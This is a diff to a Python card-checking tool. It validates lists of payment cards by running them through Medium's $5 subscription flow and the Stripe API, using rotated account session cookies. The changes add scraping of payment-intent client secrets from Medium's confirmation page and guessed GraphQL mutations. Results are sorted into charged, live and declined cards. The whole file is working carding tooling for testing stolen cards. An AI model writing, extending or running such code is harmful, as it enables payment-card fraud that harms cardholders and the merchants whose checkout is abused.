@@ -52,12 +52,10 @@ def extract_cookies_from_block(block):
     """Extract cookies from a cookies = { ... } block"""
     cookies = {}
     
-    # Find all 'key': 'value' patterns
     pattern = r"['\"]([^'\"]+)['\"]\s*:\s*['\"]([^'\"]*)['\"]"
     matches = re.findall(pattern, block)
     
     for key, value in matches:
-        # Only keep cookie-like keys (not headers)
         if key not in ['authority', 'accept', 'accept-language', 'content-type', 
                        'origin', 'referer', 'user-agent', 'sec-ch-ua', 'sec-ch-ua-mobile',
                        'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 
@@ -69,7 +67,7 @@ def extract_cookies_from_block(block):
     return cookies
 
 def load_all_cookies():
-    """Load multiple cookie sets from cookies.txt - auto detects from pasted code"""
+    """Load multiple cookie sets from cookies.txt"""
     
     if not os.path.exists(COOKIE_FILE):
         return []
@@ -79,8 +77,6 @@ def load_all_cookies():
     
     cookie_sets = []
     
-    # Find all "cookies = {" blocks using regex
-    # This pattern finds cookies = { ... } blocks
     cookie_block_pattern = r'cookies\s*=\s*\{([^}]+)\}'
     matches = re.findall(cookie_block_pattern, content, re.DOTALL)
     
@@ -88,11 +84,9 @@ def load_all_cookies():
         block = '{' + match + '}'
         cookies = extract_cookies_from_block(block)
         
-        # Only add if it has required cookies (uid and sid)
         if cookies and 'uid' in cookies and 'sid' in cookies:
             cookie_sets.append(cookies)
     
-    # Remove duplicates based on uid+sid combination
     seen = set()
     unique_sets = []
     for cookies in cookie_sets:
@@ -113,8 +107,62 @@ def get_medium_session(cookies):
     
     return session
 
-def get_payment_intent(session, cookies):
-    """Get payment intent from Medium for $5 monthly subscription"""
+def get_payment_intent_from_page(session, cookies):
+    """Get payment intent by visiting the confirmation page"""
+    
+    headers = {
+        'authority': 'medium.com',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'accept-language': 'en-US,en;q=0.9',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+    }
+    
+    try:
+        # First visit plans page
+        r = session.get('https://medium.com/plans', headers=headers, timeout=30)
+        
+        # Then visit confirmation page for monthly plan
+        r = session.get('https://medium.com/plans/confirmation/monthly', headers=headers, timeout=30)
+        html = r.text
+        
+        # Try to find client secret in the page
+        # Pattern: pi_xxxxx_secret_xxxxx
+        pi_pattern = r'(pi_[a-zA-Z0-9]+)_secret_([a-zA-Z0-9]+)'
+        match = re.search(pi_pattern, html)
+        
+        if match:
+            pi_id = match.group(1)
+            client_secret = f"{pi_id}_secret_{match.group(2)}"
+            return pi_id, client_secret, None
+        
+        # Try to find in JSON data
+        json_pattern = r'"clientSecret"\s*:\s*"(pi_[^"]+)"'
+        match = re.search(json_pattern, html)
+        
+        if match:
+            client_secret = match.group(1)
+            pi_id = client_secret.split('_secret_')[0]
+            return pi_id, client_secret, None
+        
+        # Try setup intent pattern
+        si_pattern = r'(seti_[a-zA-Z0-9]+)_secret_([a-zA-Z0-9]+)'
+        match = re.search(si_pattern, html)
+        
+        if match:
+            si_id = match.group(1)
+            client_secret = f"{si_id}_secret_{match.group(2)}"
+            return si_id, client_secret, None
+        
+        return None, None, "Could not find payment intent in page"
+        
+    except Exception as e:
+        return None, None, str(e)
+
+def get_payment_intent_graphql(session, cookies):
+    """Try different GraphQL mutations to get payment intent"""
     
     headers = {
         'authority': 'medium.com',
@@ -122,55 +170,69 @@ def get_payment_intent(session, cookies):
         'accept-language': 'en-US,en;q=0.9',
         'content-type': 'application/json',
         'origin': 'https://medium.com',
-        'referer': 'https://medium.com/plans',
+        'referer': 'https://medium.com/plans/confirmation/monthly',
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
         'apollographql-client-name': 'lite',
         'apollographql-client-version': 'main-20260116-161017-b2412ec54c',
         'medium-frontend-app': 'lite/main-20260116-161017-b2412ec54c',
-        'medium-frontend-path': '/plans',
-        'medium-frontend-route': 'plans',
+        'medium-frontend-path': '/plans/confirmation/monthly',
+        'medium-frontend-route': 'pay',
     }
     
-    # Get XSRF token from cookies
     xsrf = cookies.get('xsrf', '')
     if xsrf:
         headers['x-xsrf-token'] = xsrf
     
-    # GraphQL mutation to create payment intent for monthly subscription
-    json_data = {
-        'operationName': 'InitiateStripeSubscriptionMutation',
-        'variables': {
-            'planId': 'monthly',
-            'successPath': '/welcome-member',
-            'cancelPath': '/plans'
+    # Try CreateSubscriptionMutation
+    mutations = [
+        {
+            'operationName': 'CreateSubscriptionMutation',
+            'variables': {'planType': 'monthly'},
+            'query': '''mutation CreateSubscriptionMutation($planType: String!) {
+                createSubscription(planType: $planType) {
+                    clientSecret
+                    __typename
+                }
+            }'''
         },
-        'query': '''mutation InitiateStripeSubscriptionMutation($planId: String!, $successPath: String!, $cancelPath: String!) {
-            initiateStripeSubscription(planId: $planId, successPath: $successPath, cancelPath: $cancelPath) {
-                clientSecret
-                __typename
-            }
-        }'''
-    }
+        {
+            'operationName': 'StartSubscriptionMutation', 
+            'variables': {'plan': 'monthly'},
+            'query': '''mutation StartSubscriptionMutation($plan: String!) {
+                startSubscription(plan: $plan) {
+                    clientSecret
+                    __typename
+                }
+            }'''
+        },
+        {
+            'operationName': 'CreatePaymentIntentMutation',
+            'variables': {'planId': 'monthly'},
+            'query': '''mutation CreatePaymentIntentMutation($planId: String!) {
+                createPaymentIntent(planId: $planId) {
+                    clientSecret
+                    __typename
+                }
+            }'''
+        }
+    ]
     
-    try:
-        r = session.post('https://medium.com/_/graphql', headers=headers, json=json_data, timeout=30)
-        data = r.json()
-        
-        if 'errors' in data:
-            error_msg = data['errors'][0].get('message', 'Unknown error')
-            return None, None, f"GraphQL Error: {error_msg}"
-        
-        if 'data' in data and data['data'].get('initiateStripeSubscription'):
-            client_secret = data['data']['initiateStripeSubscription'].get('clientSecret')
-            if client_secret:
-                # Extract payment intent ID: pi_xxxxx_secret_xxxxx
-                pi_id = client_secret.split('_secret_')[0]
-                return pi_id, client_secret, None
-        
-        return None, None, "No payment intent returned"
-        
-    except Exception as e:
-        return None, None, str(e)
+    for mutation in mutations:
+        try:
+            r = session.post('https://medium.com/_/graphql', headers=headers, json=mutation, timeout=30)
+            data = r.json()
+            
+            if 'data' in data:
+                for key in data['data']:
+                    if data['data'][key] and 'clientSecret' in data['data'][key]:
+                        client_secret = data['data'][key]['clientSecret']
+                        if client_secret:
+                            pi_id = client_secret.split('_secret_')[0]
+                            return pi_id, client_secret, None
+        except:
+            continue
+    
+    return None, None, "GraphQL mutations failed"
 
 def create_payment_method(cc, mes, ano, cvv, muid, sid, guid):
     """Create Stripe payment method"""
@@ -217,8 +279,8 @@ def create_payment_method(cc, mes, ano, cvv, muid, sid, guid):
     except Exception as e:
         return {'error': {'message': str(e)}}
 
-def confirm_payment_intent(pm_id, pi_id, client_secret):
-    """Confirm payment intent to charge the card"""
+def confirm_intent(pm_id, intent_id, client_secret):
+    """Confirm payment/setup intent to charge the card"""
     
     session_id = str(uuid.uuid4())
     
@@ -244,8 +306,16 @@ def confirm_payment_intent(pm_id, pi_id, client_secret):
         'client_secret': client_secret,
     }
     
+    # Determine endpoint based on intent type
+    if intent_id.startswith('pi_'):
+        url = f'https://api.stripe.com/v1/payment_intents/{intent_id}/confirm'
+    elif intent_id.startswith('seti_'):
+        url = f'https://api.stripe.com/v1/setup_intents/{intent_id}/confirm'
+    else:
+        url = f'https://api.stripe.com/v1/payment_intents/{intent_id}/confirm'
+    
     try:
-        r = requests.post(f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm', headers=headers, data=data, timeout=30)
+        r = requests.post(url, headers=headers, data=data, timeout=30)
         return r.json()
     except Exception as e:
         return {'error': {'message': str(e)}}
@@ -259,7 +329,6 @@ def parse_confirm_response(response):
         decline_code = error.get('decline_code', '')
         message = error.get('message', 'Unknown error')
         
-        # CCN codes - card is live but declined
         ccn_codes = [
             'incorrect_cvc', 'invalid_cvc', 'incorrect_zip',
             'insufficient_funds', 'card_velocity_exceeded',
@@ -271,28 +340,24 @@ def parse_confirm_response(response):
             'invalid_amount', 'processing_error', 'reenter_transaction'
         ]
         
-        # 3DS required - card is live
         if code == 'authentication_required' or 'authentication' in message.lower() or '3d' in message.lower():
             return 'CCN', '3DS Required'
         
         if code in ccn_codes or decline_code in ccn_codes:
             return 'CCN', f"{decline_code or code}"
         
-        # Expired card - still means card exists
         if 'expired' in code or 'expired' in decline_code:
             return 'CCN', 'Expired Card'
         
         if 'rate_limit' in code:
             return 'RATE_LIMIT', message
         
-        # Card declined
         return 'DECLINED', f"{decline_code or code or message}"
     
-    # Check status
     status = response.get('status', '')
     
     if status == 'succeeded':
-        return 'CHARGED', 'Payment Successful - $5 Charged!'
+        return 'CHARGED', 'Payment Successful!'
     elif status == 'requires_action':
         next_action = response.get('next_action', {})
         action_type = next_action.get('type', '')
@@ -300,42 +365,38 @@ def parse_confirm_response(response):
             return 'CCN', '3DS Required'
         return 'CCN', f'Requires Action: {action_type}'
     elif status == 'requires_payment_method':
-        return 'DECLINED', 'Payment Method Required'
+        return 'DECLINED', 'Card Declined'
     elif status == 'processing':
-        return 'CHARGED', 'Processing (Likely Charged)'
+        return 'CHARGED', 'Processing'
     elif status == 'requires_confirmation':
         return 'CCN', 'Requires Confirmation'
     
     return 'UNKNOWN', f"Status: {status}"
 
 def check_card(cookies, cc, mes, ano, cvv):
-    """
-    Full card check flow:
-    1. Get payment intent from Medium
-    2. Create payment method
-    3. Confirm payment intent (actual charge)
-    """
+    """Full card check flow"""
     
-    # Normalize
     if len(str(ano)) == 4:
         ano = str(ano)[-2:]
     mes = str(mes).zfill(2)
     
-    # Generate consistent session tokens
     guid = generate_guid()
     muid = generate_muid()
     sid = generate_sid()
     
-    # Create session with cookies
     session = get_medium_session(cookies)
     
-    # Step 1: Get payment intent
-    pi_id, client_secret, error = get_payment_intent(session, cookies)
+    # Step 1: Get payment intent from page
+    intent_id, client_secret, error = get_payment_intent_from_page(session, cookies)
     
-    if error:
+    # If page scraping failed, try GraphQL
+    if not intent_id:
+        intent_id, client_secret, error = get_payment_intent_graphql(session, cookies)
+    
+    if error and not intent_id:
         return 'ERROR', f"PI Error: {error}"
     
-    if not pi_id or not client_secret:
+    if not intent_id or not client_secret:
         return 'ERROR', 'Failed to get payment intent'
     
     # Step 2: Create payment method
@@ -347,6 +408,11 @@ def check_card(cookies, cc, mes, ano, cvv):
         decline_code = error.get('decline_code', '')
         message = error.get('message', '')
         
+        # Check for CCN responses at PM creation
+        ccn_at_pm = ['incorrect_cvc', 'invalid_cvc', 'expired_card', 'insufficient_funds']
+        if code in ccn_at_pm or decline_code in ccn_at_pm:
+            return 'CCN', f"{decline_code or code}"
+        
         if 'invalid' in code.lower() or 'invalid' in message.lower():
             return 'DECLINED', f"Invalid Card: {message}"
         
@@ -356,8 +422,8 @@ def check_card(cookies, cc, mes, ano, cvv):
     if not pm_id:
         return 'ERROR', 'No PM ID returned'
     
-    # Step 3: Confirm payment intent (THIS IS THE ACTUAL CHARGE)
-    confirm_response = confirm_payment_intent(pm_id, pi_id, client_secret)
+    # Step 3: Confirm intent
+    confirm_response = confirm_intent(pm_id, intent_id, client_secret)
     
     status, message = parse_confirm_response(confirm_response)
     
@@ -381,7 +447,6 @@ def main():
     ╚═══════════════════════════════════════╝
     """)
     
-    # Load all cookie sets
     all_cookies = load_all_cookies()
     
     if not all_cookies:
@@ -390,19 +455,14 @@ def main():
         with open(COOKIE_FILE, 'w') as f:
             f.write("""# Just paste your full code blocks here
 # The checker will auto-detect cookies = { } blocks
-# You can paste multiple code blocks with different accounts
 
-# Example - just paste this format:
 cookies = {
     'uid': 'your_uid_here',
     'sid': 'your_sid_here',
     'xsrf': 'your_xsrf_here',
 }
-
-# Paste more code blocks below for rotation...
 """)
         print(f"[*] Please paste your code blocks to {COOKIE_FILE}")
-        print("[*] Auto-detects uid, sid, xsrf from cookies = {{ }} blocks")
         return
     
     print(f"[+] Auto-detected {len(all_cookies)} cookie set(s)")
@@ -411,16 +471,13 @@ cookies = {
         has_xsrf = 'Yes' if cookies.get('xsrf') else 'No'
         print(f"    [{i}] uid: {uid}... | xsrf: {has_xsrf}")
     
-    # Check cards.txt
     if not os.path.exists(INPUT_FILE):
         print(f"\n[!] {INPUT_FILE} not found!")
         with open(INPUT_FILE, 'w') as f:
-            f.write("# Add cards here\n")
-            f.write("# Format: cc|mm|yy|cvv\n")
-        print(f"[*] Created {INPUT_FILE} - add cards and run again.")
+            f.write("# cc|mm|yy|cvv\n")
+        print(f"[*] Created {INPUT_FILE}")
         return
     
-    # Read cards
     with open(INPUT_FILE, 'r') as f:
         lines = f.readlines()
     
@@ -437,8 +494,8 @@ cookies = {
         return
     
     print(f"\n[*] Loaded {len(cards)} cards")
-    print(f"[*] Gate: Medium $5 Monthly Charge")
-    print(f"[*] Cookie Rotation: {len(all_cookies)} accounts")
+    print(f"[*] Gate: Medium $5 Charge")
+    print(f"[*] Cookies: {len(all_cookies)}")
     print(f"[*] Delay: {DELAY}s")
     print("=" * 50)
     
@@ -459,7 +516,6 @@ cookies = {
         
         fullcc = f"{cc}|{mes}|{ano}|{cvv}"
         
-        # Get current cookie set (rotation)
         current_cookies = all_cookies[cookie_index]
         cookie_uid = current_cookies.get('uid', 'N/A')[:8]
         
@@ -486,9 +542,8 @@ cookies = {
             save_result(fullcc, status, message)
             
         elif status == 'RATE_LIMIT':
-            print(f"[!] Rate Limited on cookie {cookie_uid}")
+            print(f"[!] Rate Limited")
             cookie_index = (cookie_index + 1) % len(all_cookies)
-            print(f"[*] Switching to next cookie...")
             time.sleep(5)
             errors += 1
             
@@ -497,14 +552,13 @@ cookies = {
             print(f"[-] {message}")
             errors += 1
             
-            if 'unauthorized' in message.lower() or 'login' in message.lower() or 'not authenticated' in message.lower():
-                print(f"[!] Cookie {cookie_uid} expired!")
+            if 'unauthorized' in message.lower() or 'login' in message.lower():
+                print(f"[!] Cookie expired!")
                 if len(all_cookies) > 1:
                     all_cookies.pop(cookie_index)
                     cookie_index = cookie_index % len(all_cookies)
-                    print(f"[*] Removed bad cookie ({len(all_cookies)} remaining)")
                 else:
-                    print("[!] No more valid cookies!")
+                    print("[!] No more cookies!")
                     break
             
         else:
@@ -515,7 +569,6 @@ cookies = {
         
         print(f"[*] {elapsed}s")
         
-        # Rotate to next cookie
         cookie_index = (cookie_index + 1) % len(all_cookies)
         
         if i < total:
@@ -530,8 +583,6 @@ cookies = {
     print(f"Dead:      {dead}")
     print(f"Errors:    {errors}")
     print("=" * 50)
-    print(f"Live saved to: {LIVE_FILE}")
-    print(f"Dead saved to: {DEAD_FILE}")
 
 if __name__ == "__main__":
     main()
